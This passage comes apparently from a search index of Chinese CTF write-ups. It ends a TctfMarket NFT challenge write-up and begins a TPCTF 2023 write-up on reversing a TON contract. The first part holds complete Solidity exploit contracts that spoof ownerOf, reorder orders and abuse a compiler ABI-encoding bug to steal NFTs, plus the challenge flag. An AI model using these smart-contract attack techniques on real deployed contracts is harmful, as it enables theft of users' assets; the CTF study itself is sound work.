\u7b7e\u7f72\u7684</li> </ul> </li> </ul> </li> </ul> <p>\u5206\u6790\u4e0b\u6765\u5df2\u7ecf\u5f97\u5230\u4e86\u5f88\u591a\u7591\u70b9\u548c\u6709\u6f0f\u6d1e\u7684\u5730\u65b9\uff0c\u4e09\u4e2a\u4ee3\u5e01\u7684\u83b7\u53d6\u65b9\u6cd5\u4e5f\u5c31\u57fa\u672c\u6e05\u6670\u4e86\uff1a</p> <ul> <li>1 \u53f7\u4ee3\u5e01\u901a\u8fc7 airdrop \u62ff\u5230 5 TTK \u540e\u53ef\u4ee5\u76f4\u63a5\u8d2d\u4e70</li> <li>2 \u53f7\u4ee3\u5e01\u901a\u8fc7 purchaseTest \u65b9\u6cd5\u7684\u6f0f\u6d1e\u9a97\u53d6 1337 TTK \u540e\u8d2d\u4e70<ul> <li>\u5148\u521b\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684 TctfNFT \u5408\u7ea6</li> <li>\u7ed9\u81ea\u5df1\u53d1\u653e\u4e00\u4e2a\u4ee3\u5e01</li> <li>\u5c06\u81ea\u5df1\u7684\u6743\u9650\u5168\u6743\u4ee3\u7406\u7ed9\u5546\u573a</li> <li>\u8c03\u7528 puchaseTest \u65b9\u6cd5\uff0c\u4f20\u5165\u81ea\u5df1\u5efa\u7684 NFT \u5408\u7ea6\u5730\u5740\u3001\u53d1\u653e\u7684\u4ee3\u5e01\u7f16\u53f7\u30011337 TTK \u7684\u4ef7\u683c<ul> <li>\u8fd9\u65f6\u91cc\u9762\u4f1a\u521b\u5efa\u8fd9\u4e2a\u8ba2\u5355\u5e76\u4e14\u81ea\u5df1\u8d2d\u4e70</li> <li>\u4e0d\u8fc7\u81ea\u5df1\u8d2d\u4e70\u65f6\u6536\u6b3e\u65b9\u5e76\u4e0d\u662f\u81ea\u5df1\uff0c\u800c\u662f\u8fd9\u4e2a\u4ee3\u5e01\u7684 owner\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u7684\u8d26\u6237\uff0c\u6240\u4ee5\u5c31\u9a97\u5230\u4e86 1337 TTK</li> </ul> </li> <li>\uff08\u4e0d\u901a\u8fc7\u5df2\u4e70\u7684 1 \u53f7\u4ee3\u5e01\u9a97\u94b1\u7684\u539f\u56e0\u662f\u8fd9\u6837\u4f1a\u5bfc\u81f4 1 \u53f7\u4ee3\u5e01\u65e0\u6cd5\u518d\u56de\u6536\uff09</li> </ul> </li> <li>3 \u53f7\u4ee3\u5e01\u901a\u8fc7 CouponVerifierBeta \u7684\u6f0f\u6d1e\uff0c\u5728 ownerOf \u91cc\u8c03\u7528\u5220\u9664\u8ba2\u5355\u4f7f\u8ba2\u5355\u961f\u5217\u4e71\u5e8f\uff0c\u4ece\u800c\u7528\u6b63\u786e\u7684\u4f18\u60e0\u5238\u548c\u4ef7\u683c\u4e70\u5230\u5176\u5b83\u8ba2\u5355\u4e2d\u7684\u4ee3\u5e01</li> </ul> <p>1\u30012 \u53f7\u83b7\u53d6\u7684\u6d41\u7a0b\u5df2\u7ecf\u5f88\u6e05\u6670\u4e86\uff0c\u800c\u4e14\u5176\u987a\u5e8f\u5e76\u4e0d\u5f71\u54cd\uff0c\u53ef\u4ee5\u968f\u65f6\u901a\u8fc7\u5bf9\u5e94\u65b9\u6cd5\u83b7\u5f97\u3002\u4e0b\u9762\u4e3b\u8981\u8bf4 3 \u53f7\u4ee3\u5e01\uff0c\u4e5f\u5c31\u662f\u6700\u7cbe\u5f69\u7684\u90e8\u5206\uff1a</p> <p>\u8fd9\u4e2a\u4ee3\u5e01\u7684\u83b7\u53d6\u65b9\u6cd5\u80af\u5b9a\u662f\u901a\u8fc7 purchaseWithCoupon \u65b9\u6cd5\uff0c\u518d\u634b\u4e00\u4e0b\u8c03\u7528\u7684\u6574\u4e2a\u8fc7\u7a0b\uff1a</p> <ol> <li>\u53d6\u51fa\u53c2\u6570\u4e2d\u7684 coupon</li> <li>\u9a8c\u8bc1 user\uff08\u4f7f\u7528\u8005\uff09\u662f\u5426\u662f\u8c03\u7528\u8005\uff0cnewprice \u662f\u5426\u5927\u4e8e 0</li> <li>\u8c03\u7528 verifier.verifyCoupon \u65b9\u6cd5<ol> <li>\u53d6\u51fa coupon\u3001sig\u3001order\uff08\u8ba2\u5355\u5168\u90e8\u5185\u5bb9\uff09</li> <li>\u6784\u9020\u5e8f\u5217\u5316\u4fe1\u606f</li> <li>\u8c03\u7528 order.nftAddress \u4e0a\u7684 ownerOf \u65b9\u6cd5\u83b7\u5f97 owner</li> <li>\u9a8c\u8bc1 issuer\uff08\u4e0b\u53d1\u4f18\u60e0\u5238\u7684\u4eba\uff09\u662f\u5426\u662f owner</li> <li>\u9a8c\u8bc1\u7b7e\u540d\u662f\u5426\u662f issuer \u4e3a\u5e8f\u5217\u5316\u4fe1\u606f\u7b7e\u7f72\u7684</li> </ol> </li> <li>\u6839\u636e coupon.orderId \u53d6\u51fa\u5e76\u5220\u9664\u8ba2\u5355</li> <li>\u8c03\u7528 order.nftAddress \u4e0a\u7684 ownerOf \u65b9\u6cd5\u83b7\u5f97 owner</li> <li>coupon.user \u5411 owner \u8f6c coupon.newprice \u4e2a TTK</li> <li>owner \u5c06 order.tokenId \u8fd9\u4e2a\u4ee3\u5e01\u8f6c\u7ed9 coupon.user</li> </ol> <p>\u5176\u4e2d coupon \u63d0\u53d6\u7684\u65f6\u673a\u5f88\u5173\u952e\uff1a</p> <ul> <li>\u5728 purchaseWithCoupon \u65b9\u6cd5\u5f00\u5934\u5c31\u63d0\u53d6\u4e86 coupon \u5168\u90e8\u5185\u5bb9\u5230\u5185\u5b58\u4e2d\uff0c\u56e0\u6b64 verifier.verifyCoupon \u8fd4\u56de\u540e coupon.orderId\u3001coupon.user \u4e0d\u4f1a\u53d8</li> <li>\u5728 verifier.verifyCoupon \u65b9\u6cd5\u4e2d\u4e5f\u662f\u5f00\u5934\u5c31\u63d0\u53d6\u4e86 coupon \u5168\u90e8\u5185\u5bb9\uff0c\u5e76\u5728 ownerOf \u8c03\u7528\u524d\u5c31\u521b\u5efa\u4e86\u5bf9\u5e94\u7684\u5e8f\u5217\u5316\u4fe1\u606f</li> </ul> \u9519\u8bef\u7684\u65b9\u6cd5 <p>\u6240\u4ee5\u53ea\u8981\u6211\u4eec\u521b\u5efa\u4e00\u4e2a\u81ea\u5df1\u7684\u8ba2\u5355\uff08nftAddress \u662f\u81ea\u5df1\u90e8\u7f72\u7684\u6709\u95ee\u9898\u7684\u5408\u7ea6\uff09\uff0c\u901a\u8fc7\u67d0\u4e9b\u65b9\u6cd5\u8ba9\u5176\u987a\u5e8f\u53d8\u5230 3 \u53f7\u4ee3\u5e01\u5bf9\u5e94\u8ba2\u5355\u4e4b\u524d\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728 verifier.verifyCoupon \u65b9\u6cd5\u4e2d\u8c03\u7528 ownerOf \u65f6\u5728\u5176\u5185\u90e8\u5220\u9664\u6389\u8fd9\u4e2a\u8ba2\u5355\uff0c\u5bfc\u81f4\u540e\u9762\u901a\u8fc7 getOrder(coupon.orderId).tokenId \u83b7\u53d6\u5230\u7684\u5b9e\u9645\u4e0a\u662f 3 \u53f7\u4ee3\u5e01</p> <p>\u8fd9\u6837\u56de\u5230 purchaseWithCoupon \u65b9\u6cd5\u4e4b\u540e\u53d6\u51fa\u4e86\u8ba2\u5355\uff08\u552e\u5356\u7684 tokenId \u662f 3\uff0cnftAddress \u4e5f\u662f\u5546\u573a\u4e2d\u7684 NFT \u5730\u5740\uff09\u4ed8\u6b3e\u53ea\u9700\u4ed8 coupon.newprice \u8fd9\u4e48\u591a\u5c31\u53ef\u4ee5\u5f97\u5230 3 \u53f7\u4ee3\u5e01\u3002</p> <p>\u4e71\u5e8f\u7684\u65b9\u6cd5\u662f\uff1a</p> <ul> <li>\u8d77\u59cb\uff1a1 2 3</li> <li>\u589e\u52a0\u4e00\u4e2a\u81ea\u5df1\u7684\uff1a1 2 3 4</li> <li>\u4e70\u4e0b 2\uff1a1 4 3\uff08\u6b64\u65f6\u81ea\u5df1\u7684\u8ba2\u5355\u5728 3 \u524d\uff09</li> </ul> <p>\u4e0d\u8fc7\u4e0a\u9762\u8fd9\u4e2a\u65b9\u6cd5\u662f\u6709\u95ee\u9898\u7684\uff0c\u4fee\u6539 ownerOf \u5728\u5176\u4e2d\u5220\u9664\u8ba2\u5355\u7684\u8bdd\u4f1a\u5bfc\u81f4\u8fd9\u4e2a\u65b9\u6cd5\u5e76\u4e0d\u662f view \u65b9\u6cd5\uff0c\u9700\u8981\u4f7f\u7528 call \u800c\u4e0d\u662f staticcall \u8c03\u7528\u3002\u4f46\u662f\u901a\u8fc7 IERC721 \u5f97\u5230\u7684\u63a5\u53e3\u662f view \u7684\uff0c\u4f1a\u4f7f\u7528 staticcall \u8c03\u7528\uff0c\u4ece\u800c\u5bfc\u81f4 revert</p> <p>\u89e3\u51b3\u8fd9\u4e2a\u95ee\u9898\u7684\u5173\u952e\u5728\u4e8e\u9898\u76ee\u6307\u5b9a\u4e86 solidity \u7f16\u8bd1\u5668\u7248\u672c\u4e3a 0.8.15\u3002\u8fd9\u4e2a\u7248\u672c\u7684\u7f16\u8bd1\u5668\u5b58\u5728\u4e00\u4e2a bug\u3002\u6765\u81ea solidity 0.8.16 release post\uff1a</p> <p>Important Bugfixes:</p> <ul> <li>Code Generation: Fix data corruption that affected ABI-encoding of calldata values represented by tuples: structs at any nesting level; argument lists of external functions, events and errors; return value lists of external functions. The 32 leading bytes of the first dynamically-encoded value in the tuple would get zeroed when the last component contained a statically-encoded array.</li> </ul> <p>\u6362\u53e5\u8bdd\u8bf4\u5c31\u662f\u5728\u8c03\u7528 verifyCoupon \u65b9\u6cd5\u65f6\u5176\u63a5\u6536\u5230\u7684 scoupon \u7684\u524d 32 \u5b57\u8282\u4f1a\u53d8\u6210\u5168 0\uff0c\u800c\u5bf9\u5e94\u7ed3\u6784\u4f53\u4e2d\u8fd9\u4e2a\u4f4d\u7f6e\u521a\u597d\u662f orderId\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u65e0\u8bba\u5982\u4f55 verifyCoupon \u7684\u59cb\u7ec8\u662f\u7b2c\u4e00\u4e2a\u8ba2\u5355\u4e0a\u7684\u4fe1\u606f\u3002\u56e0\u6b64\u6211\u4eec\u8ba2\u5355\u5217\u8868\u7684\u987a\u5e8f\u5c31\u53ef\u4ee5\u662f\uff1a</p> <ul> <li>\u521d\u59cb\uff1a1 2 3</li> <li>\u65b0\u5efa\uff1a1 2 3 4</li> <li>\u4e70\u4e0b 1\uff1a4 2 3</li> <li>\u4e70\u4e0b 2: 4 3</li> </ul> <p>\u6240\u4ee5\u6700\u7ec8\u9a8c\u8bc1\u7684\u8fd8\u662f\u6211\u4eec\u81ea\u5df1\u8ba2\u5355\u4e0a\u7684\u4fe1\u606f\uff0c\u800c owner \u539f\u672c\u662f\u653b\u51fb\u5408\u7ea6\uff0c\u4e0d\u8fc7\u7b7e\u7f72\u8005\u53ea\u80fd\u662f\u7528\u6237\u8d26\u6237\uff0c\u6240\u4ee5\u9700\u8981\u4f2a\u9020\u4e00\u4e0b\uff0c\u7528\u4e00\u4e2a\u7528\u6237\u8d26\u6237\u7b7e\u7f72\u5f97\u5230\u7b7e\u540d\uff0c\u5e76\u5728 ownerOf \u7684\u65f6\u5019\u8fd4\u56de\u8fd9\u4e2a\u7b7e\u7f72\u8005\u5730\u5740\uff08\u8fd9\u6837 ownerOf \u65b9\u6cd5\u8fd8\u662f view \u7684\uff0c\u53ef\u4ee5 staticcall\uff09</p> \u6838\u5fc3\u4ee3\u7801 <p>ExploitNFT<pre><code>contract ExploitNFT is Context, ERC165 {\n    ...\n\n    address public fake_issuer;\n\n    function set_fake_issuer(address src) public {\n        fake_issuer = src;\n    }\n\n    function ownerOf(uint256 tokenId) public virtual  returns (address) {\n        if (fake_issuer != address(this)) {\n            address fake = fake_issuer;\n            return fake;\n        } else {\n            address owner = _owners[tokenId];\n            return owner;\n        }\n    }\n\n    ...\n}\n</code></pre> Exploit<pre><code>contract Exploit {\n    TctfMarket public market;\n    TctfNFT public myNFT;\n    ExploitNFT public expNFT;\n    address public issuer;\n\n    constructor(address chal, address issuer_) {\n        issuer = issuer_;\n        market = TctfMarket(chal);\n        myNFT = new TctfNFT();\n        expNFT = new ExploitNFT(\"ExploitNFT\", \"ENFT\", chal);\n    }\n\n    function airdrop() public {\n        market.tctfToken().airdrop();\n    }\n\n    function buyToken1() public returns (bool) {\n        market.tctfToken().approve(address(market), 1);\n        market.purchaseOrder(0);\n        return market.tctfNFT().ownerOf(1) == address(this);\n    }\n\n    function getTokenFromMarket() public {\n        myNFT.mint(address(this), 1);\n        myNFT.setApprovalForAll(address(market), true);\n        market.purchaseTest(address(myNFT), 1, 1337);\n    }\n\n    function buyToken2() public returns (bool) {\n        market.tctfToken().approve(address(market), 1337);\n        market.purchaseOrder(1);\n        return market.tctfNFT().ownerOf(2) == address(this);\n    }\n\n    function createNewOrder() public {\n        expNFT.mint(address(this), 1);\n        market.createOrder(address(expNFT), 1, 1);\n    }\n\n    function buyToken3(uint8 v, bytes32[2] calldata rs) public returns (bool) {\n        market.tctfToken().approve(address(market), 1);\n        expNFT.setApprovalForAll(address(market), true);\n        expNFT.set_fake_issuer(issuer);\n        require(market.getOrder(0).nftAddress == address(expNFT), \"not valid\");\n        require(market.getOrder(1).nftAddress == address(market.tctfNFT()), \"not valid\");\n        require(address(market.tctfNFT()) != address(expNFT), \"not valid\");\n        market.purchaseWithCoupon(SignedCoupon(\n            Coupon(\n                1, // orderId\n                1, // newprice\n                issuer, // issuer\n                address(this), // user\n                bytes(\"exploit\")\n            ),\n            Signature(\n                v, rs\n            )\n        ));\n        return market.tctfNFT().ownerOf(3) == address(this);\n    }\n\n    function getSerialized() public returns (bytes32) {\n        Coupon memory coupon;\n        Order memory order;\n        order.nftAddress = address(expNFT);\n        order.tokenId = 1;\n        order.price = 1;\n        coupon.user = address(this);\n        coupon.issuer = issuer;\n        coupon.newprice = 1;\n        coupon.reason = bytes(\"exploit\");\n        bytes memory serialized = abi.encode(\n            \"I, the issuer\", coupon.issuer,\n            \"offer a special discount for\", coupon.user,\n            \"to buy\", order, \"at\", coupon.newprice,\n            \"because\", coupon.reason\n        );\n        return keccak256(serialized);\n    }\n\n    function check(uint8 v, bytes32[2] calldata rs) public returns (bool) {\n        return ecrecover(getSerialized(), v, rs[0], rs[1]) == issuer;\n    }\n\n    function exp1() public returns (bool) {\n        airdrop();\n        createNewOrder();\n        getTokenFromMarket();\n        if (!buyToken1()) return false;\n        if (!buyToken2()) return false;\n        return true;\n    }\n\n    function exp2(uint8 v, bytes32[2] calldata rs) public returns (bool) {\n        if (!buyToken3(v, rs)) return false;\n        market.win();\n        return true;\n    }\n\n    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n}\n</code></pre> \u518d\u914d\u5408 web3.py \u8fdb\u884c\u4ea4\u4e92\u5373\u53ef\uff08\u7b7e\u7f72\u4e5f\u5728\u8fd9\u91cc\u5b8c\u6210\uff09</p> <p>flag: flag{off_by_null_in_the_market_d711fbd6a7c0c015b42d}</p>"}, {"location": "writeups/tpctf2023/", "title": "TPCTF 2023 Writeup", "text": "<p> \u7ea6 2147 \u4e2a\u5b57  398 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 12 \u5206\u949f</p> <p>Abstract</p> <p>\u6e05\u5317\u5408\u529e\u7684 XCTF \u5206\u7ad9\u8d5b\uff0c\u9898\u4e0d\u5c11\uff0c\u8d28\u91cf\u5f88\u9ad8\uff0c\u961f\u53cb\u5e26\u98de\u4e86</p> <p></p> <p>\u7b2c\u4e00\u5929\u4e00\u76f4\u5728\u505a\u533a\u5757\u94fe\u9898\u6ca1\u770b\u522b\u7684\uff0c\u7b2c\u4e8c\u5929\u505a\u4e86\u4fe9 misc</p>"}, {"location": "writeups/tpctf2023/#tonyscontract", "title": "TonysContract", "text": "<p>\u4e00\u4e2a\u6ca1\u63a5\u89e6\u8fc7\u7684\u533a\u5757\u94fe\uff0c\u53eb TONcoin\uff0c\u9898\u76ee\u7ed9\u4e86\u4e00\u4e2a\u516c\u7f51\u4e0a\u7684\u5408\u7ea6 https://testnet.ton.cx/address/EQAM2HjRB-PFaD2mlJ5QjQAlfRAcmZ-j9ydT_54FzmbffN6E\uff0c\u6362\u4e00\u4e2a\u533a\u5757\u6d4f\u89c8\u5668\u662f https://testnet.tonscan.org/address/EQAM2HjRB-PFaD2mlJ5QjQAlfRAcmZ-j9ydT_54FzmbffN6E\u3002\u56e0\u4e3a\u662f\u516c\u7f51\uff0c\u6240\u4ee5\u5e94\u8be5\u5c31\u4e0d\u662f\u9700\u8981\u53d1\u4ea4\u6613\u7684\uff0c\u6709\u5408\u7ea6\u5b57\u8282\u7801\uff0c\u6240\u4ee5\u5148\u8003\u8651\u9006\u5411\u5408\u7ea6\u3002</p> \u9898\u76ee\u5408\u7ea6\u53cd\u6c47\u7f16 <pre><code>SETCP0\n(:methods\nrecv_internal: \n    2 2 BLKDROP2\n    c4 PUSH\n    CTOS\n    8 LDU\n    s1 POP\n    32 LDU\n    s0 s2 XCHG\n    32 PUSHINT\n    SDSKIPFIRST\n    NOW\n    ROT\n    LESS\n    6 THROWIF\n    s0 PUSH\n    SBITS\n    344 PUSHINT\n    EQUAL\n    6 THROWIFNOT\n    PUSHNULL\n    s2 PUSH\n    SEMPTY\n    NOT\n    &lt;{\n    s0 POP\n    s0 s1 XCHG\n    LDDICT\n    ROTREV\n    }&gt; PUSHCONT\n    IF\n    s0 s3 XCHG\n    CTOS\n    4 PUSHINT\n    SDSKIPFIRST\n    LDMSGADDR\n    s0 POP\n    s0 s1 XCHG\n    48 LDU\n    s0 s1 XCHG\n    92703703713403 PUSHINT\n    EQUAL\n    6 THROWIFNOT\n    NIL\n    11000385076366155543686602566826962197403024283852028545596640486225 PUSHINT\n    SETRAND\n    36 PUSHINT\n    PUSHREFCONT\n    REPEAT\n    s4 POP\n    8 LDU\n    s0 POP\n    125 EQINT\n    6 THROWIFNOT\n    35 PUSHINT\n    s0 PUSH\n    PUSHREFCONT\n    REPEAT\n    s0 POP\n    0 PUSHINT\n    36 PUSHINT\n    PUSHREFCONT\n    REPEAT\n    s1 s3 XCHG\n    s0 s1 XCHG\n    8 LDU\n    233 PUSHINT\n    ROT\n    MUL\n    8 PUSHPOW2\n    RAND\n    ADD\n    8 PUSHPOW2DEC\n    AND\n    8 PUSHPOW2\n    RAND\n    XOR\n    s5 PUSH\n    -8 PUSHINT\n    DICTUGET\n    NULLSWAPIFNOT\n    s0 POP\n    8 LDU\n    s0 POP\n    s1 s2 XCHG\n    TPUSH\n\nrecv_external: \n    s0 POP\n    c4 PUSH\n    CTOS\n    8 LDU\n    s0 s1 XCHG\n    0 EQINT\n    6 THROWIFNOT\n    ACCEPT\n    32 LDU\n    PUSHNULL\n    s1 PUSH\n    SEMPTY\n    NOT\n    &lt;{\n    s0 POP\n    LDDICT\n    s0 s1 XCHG\n    }&gt; PUSHCONT\n    IF\n    s0 s1 XCHG\n    288 PUSHINT\n    LDSLICEX\n    s0 POP\n    1 PUSHINT\n    NEWC\n    8 STU\n    s1 s3 XCHG\n    32 STU\n    STDICT\n    s0 s1 XCHG\n    STSLICER\n    ENDC\n    c4 POP\n) 19 DICTPUSHCONST\nDICTIGETJMPZ\n11 THROWARG\n</code></pre> <p>\u9996\u5148\u7b80\u5355\u5b66\u4e00\u4e0b\u8fd9\u4e2a\u94fe\uff0c\u4e00\u4e9b\u6750\u6599\uff1a</p> <ul> <li>\u4e00\u7bc7 TON \u5408\u7ea6\u5f00\u53d1\u5165\u95e8\u7684\u6587\u7ae0</li> <li>https://github.com/ton-blockchain</li> <li>https://github.com/ton-community</li> <li>https://docs.ton.org/develop/overview</li> <li>\u5b98\u65b9\u6587\u6863\u5165\u95e8\u6559\u7a0b https://docs.ton.org/develop/howto/step-by-step</li> </ul> <p>\u5f97\u5230\u4e86\u4ee5\u4e0b\u4fe1\u606f\uff1a</p> <ul> <li>TON \u4e2d\u7684\u8d26\u6237\u4e0d\u533a\u5206 ETH \u4e00\u6837\u7684 EOA \u548c\u5408\u7ea6\u8d26\u6237\uff0c\u4e00\u5207\u7686\u5408\u7ea6</li> <li>\u5408\u7ea6\u5730\u5740\u662f 32 \u5b57\u8282\u6570\uff0c\u540c\u65f6\u6709\u5305\u88c5\u4e86\u6821\u9a8c\u4fe1\u606f\u7b49\u518d base64 \u7684 user-friendly \u5730\u5740\u5199\u6cd5<ul> <li>https://docs.ton.org/learn/overviews/addresses</li> </ul> </li> <li>\u5408\u7ea6\u91c7\u7528 FunC\uff08\u9ad8\u7ea7\uff09\u6216 Fift\uff08\u4f4e\u7ea7\uff09\u8bed\u8a00\u7f16\u5199\uff0c\u7f16\u8bd1\u5230 TVM \u5b57\u8282\u7801</li> <li>\u5408\u7ea6\u90e8\u7f72\u7684\u65f6\u5019\u6709 code \u548c data \u4e24\u4e2a\u90e8\u5206<ul> <li>\u90fd\u662f\u5b58\u5728\u94fe\u4e0a\u7684\uff0ccode \u90e8\u5206\u662f\u5408\u7ea6\u7684\u5b57\u8282\u7801\uff0cdata \u90e8\u5206\u662f\u5408\u7ea6\u7684\u6570\u636e\uff08\u53ef\u4fee\u6539\uff09</li> <li>\u90e8\u7f72\u65b9\u5f0f\u5e94\u8be5\u7c7b\u4f3c ETH \u662f\u901a\u8fc7\u6267\u884c deploy bytecode \u6765\u540c\u65f6\u90e8\u7f72 code \u548c data\uff08\u6ca1\u7ec6\u770b\uff09</li> </ul> </li> <li>code\u3001data\u3001message \u7b49\u7684\u8868\u793a\u65b9\u5f0f\u90fd\u662f\u4f7f\u7528 bag of cells (boc) \u6765\u7f16\u7801\u7684<ul> <li>https://docs.ton.org/develop/data-formats/cell-boc</li> <li>cell \u662f TON \u4e2d\u7684\u4e00\u4e2a\u57fa\u672c\u7ed3\u6784\uff0c\u53ef\u4ee5\u5b58\u50a8 1023 \u4e2a bit\uff0c\u5e76\u4e14\u5e26\u6709\u6700\u591a\u56db\u4e2a\u6307\u5411\u5176\u4ed6 cells \u7684 reference</li> <li>cell \u7684\u7f16\u7801\u6709\u70b9\u590d\u6742\uff0c\u53ef\u4ee5\u770b\u94fe\u63a5\u91cc\u7684\u793a\u4f8b</li> <li>cell \u9010\u4e2a\u94fe\u63a5\u5f62\u6210\u7684\u6574\u4f53\u5c31\u662f bag of cells\uff0c\u7f16\u7801\u5c31\u662f\u5c06\u6240\u6709 cell \u6253\u5305</li> <li>\u533a\u5757\u6d4f\u89c8\u5668\u89e3\u6790\u51fa\u6765\u7684 cells \u7ed3\u6784\u5c31\u662f boc \u7684\u6811\u5f62\u7ed3\u6784<ul> <li>\u7f29\u8fdb\u4ee3\u8868 ref \u7684\u5b50\u8282\u70b9\uff0cx{} \u4e2d\u7684\u5185\u5bb9\u5c31\u662f cell \u7684\u5185\u5bb9</li> <li>x{} \u4e2d\u5e26\u6709\u7684\u4e0b\u5212\u7ebf\u8868\u793a\u5c06\u6700\u540e\u4e00\u4e2a 1 \u4ee5\u53ca\u540e\u9762\u6240\u6709\u7684 0 \u5220\u6389\uff08\u4ee5\u6b64\u8868\u793a\u975e 8 \u7684\u500d\u6570\u7684 bit\uff09</li> </ul> </li> <li>message \u7b49\u7684\u89c4\u8303\u6587\u6863\u91cc\u901a\u8fc7\u5f15\u5165\u4e86\u4e00\u4e2a\u65b0\u7684\u53eb TL-B \u7684\u8bed\u8a00\u6765\u89c4\u5b9a\uff08\u770b\u8d77\u6765\u597d\u590d\u6742\u597d\u8822\uff09<ul> <li>https://docs.ton.org/develop/data-formats/msg-tlb</li> </ul> </li> </ul> </li> <li>TVM \u662f\u4e00\u4e2a\u6808\u5f0f\u865a\u62df\u673a\uff0c\u6307\u4ee4\u5f88\u591a\uff08\u7c7b\u4f3c CISC\uff09\uff0c\u6709\u4e00\u4e2a\u4e34\u65f6\u7684\u6808\u548c\u4e00\u4e9b\u5bc4\u5b58\u5668<ul> <li>https://docs.ton.org/learn/tvm-instructions/tvm-overview</li> <li>\u6808\u4e0a\u5143\u7d20\u53ef\u4ee5\u6709\u7c7b\u578b\uff1a<ul> <li>257bit \u6574\u578b\u3001\u5143\u7ec4\u3001Null</li> <li>cell\u3001slice\uff08\u53ef\u8bfb\u7684 cell\uff09\u3001builder\uff08\u53ef\u5199\u7684 cell\uff09\u3001continuation\uff08\u4e00\u7ec4\u53ef\u6267\u884c\u7684\u5b57\u8282\u7801\uff09</li> </ul> </li> <li>\u6808\u7684\u521d\u59cb\u5316\u4f9d\u6b21 push balance value raw_message message_body funcion_selector\uff08internal \u8c03\u7528\u7684\u60c5\u51b5\uff09<ul> <li>https://docs.ton.org/learn/tvm-instructions/tvm-initialization#internal-message</li> </ul> </li> <li>\u5bc4\u5b58\u5668 s0 \u5c31\u8868\u793a\u6808\u9876\u5143\u7d20\uff0cs1 \u8868\u793a\u6808\u9876\u7b2c\u4e8c\u4e2a\u5143\u7d20\uff0c\u4ee5\u6b64\u7c7b\u63a8<ul> <li>\u5176\u5b9e\u5c31\u662f\u522b\u540d\uff0c\u4e0d\u662f\u72ec\u7acb\u4e8e\u6808\u4e4b\u5916\u7684\u5bc4\u5b58\u5668</li> </ul> </li> <li>\u6709 c0-c7 \u516b\u4e2a\u63a7\u5236\u5bc4\u5b58\u5668\uff1a<ul> <li>\u5176\u4e2d\u6bd4\u8f83\u91cd\u8981\u7684\u6709 c4 \u521d\u59cb\u8868\u793a\u5408\u7ea6\u7684 data \u90e8\u5206\uff0cc7 \u521d\u59cb\u8868\u793a\u4e00\u4e9b\u4e34\u65f6\u6570\u636e</li> <li>https://docs.ton.org/learn/tvm-instructions/tvm-overview#control-registers</li> </ul> </li> <li>\u9ed8\u8ba4\u6709\u4e24\u4e2a\u51fd\u6570\uff0c\u94fe\u4e0a\u5408\u7ea6\u4e4b\u95f4\u8c03\u7528\u4f1a\u89e6\u53d1 recv_internal\uff0c\u4ece\u5916\u90e8\u8c03\u7528\u4f1a\u89e6\u53d1 recv_external</li> <li>\u8c03\u7528\u7684\u65f6\u5019\u5148\u521d\u59cb\u5316\u6808\u548c\u5bc4\u5b58\u5668\uff0c\u7136\u540e\u6267\u884c\u5b57\u8282\u7801<ul> <li>\u5b57\u8282\u7801\u5f00\u5934\u4e00\u822c\u4f1a\u8bfb\u53d6 function_selector \u5224\u65ad\u8c03\u7528\u7684\u51fd\u6570\uff0c\u7136\u540e\u8df3\u8f6c\u5230\u5bf9\u5e94\u7684\u4ee3\u7801\u6bb5\uff080 \u8868\u793a internal\uff0c-1 \u8868\u793a external\uff09</li> <li>\u8fd9\u65f6\u5019\u53ef\u4ee5\u4ece\u6808\u4e0a\u8bfb\u53d6 message \u5185\u5bb9\uff0c\u4ece c4 \u4e2d\u8bfb\u53d6 data \u90e8\u5206\u5185\u5bb9</li> </ul> </li> <li>\u5177\u4f53\u7684\u6307\u4ee4\u53ef\u4ee5\u770b\u6587\u6863\uff0c\u6216\u8005\u6587\u6863\u6e90\u7801 GitHub \u91cc\u7684 csv \u8868\u683c<ul> <li>https://docs.ton.org/learn/tvm-instructions/instructions</li> </ul> </li> </ul> </li> </ul> <p>\u63a5\u4e0b\u6765\u662f\u9898\u76ee\uff0c\u5bf9\u7740\u5b57\u8282\u7801\u6a21\u62df\u6808\u9006\u4e86 external \u53d1\u73b0\u5176\u5b9e\u4ec0\u4e48\u90fd\u6ca1\u5e72\uff0c\u6240\u4ee5\u5176\u5b9e\u4e3b\u8981\u903b\u8f91\u90fd\u5728 internal \u4e2d\u3002\u5b57\u8282\u7801\u91cc\u51fa\u73b0\u4e86 LDDICT \u6307\u4ee4\uff0c\u5373\u4ece\u6808\u9876\u7684 cell \u4e2d\u63d0\u53d6\u51fa\u4e00\u4e2a dict\uff0c\u4f46 dict \u662f\u4ec0\u4e48\u3001\u600e\u4e48\u89e3\u6790\u90fd\u4e0d\u592a\u6e05\u695a\uff0c\u6240\u4ee5\u5e72\u8106\u627e\u52a8\u8c03\u7684\u624b\u6bb5\u4e86\u3002</p> <p>\u53ef\u4ee5\u641c\u5230  ton-community/ton-contract-executor\uff0c\u53ef\u4ee5\u5728\u672c\u5730\u4e0d\u9700\u8981 TON \u7f51\u7edc\u5c31\u6267\u884c\u4e00\u4e2a\u5408\u7ea6\uff0c\u9700\u8981 yarn \u88c5\u4e00\u4e0b\u4f9d\u8d56\uff0c\u7136\u540e\u7f16\u5199\u4e00\u4e2a main.mjs:</p> <pre><code>import { SmartContract, internal, externalIn } from \"ton-contract-executor\";\nimport { Cell, BitString } from \"@ton/core\";\n\nasync function main() {\n    let contract = await SmartContract.fromCell(\n        Cell.fromBoc(Buffer.from(\"...\", \"hex\"))[0],\n        Cell.fromBoc(Buffer.from(\"...\", \"base64\"))[0],\n        {debug: true}\n    );\n    const msgBody = new Cell();\n    console.log(msgBody);\n    const res = await contract.sendInternalMessage(\n        internal({\n            dest: contract.address,\n            value: 0n,\n            bounce: false,\n            body: msgBody,\n        })\n    )\n    console.log(res);\n    console.log(res.logs);\n}\n\nawait main();\n</code></pre> <p>\u8fd9\u6837\u7ed9\u5408\u7ea6\u5f00\u542f debug \u4e4b\u540e\u5c31\u53ef\u4ee5\u8f93\u51fa\u6bcf\u6b21\u6267\u884c\u6307\u4ee4\u7684\u4fe1\u606f\uff0c\u4ee5\u6b64\u53ef\u4ee5\u89e3\u51b3\u4e0d\u77e5\u9053\u6302\u5728\u54ea\u91cc\u4ee5\u53ca PUSHREFCONT 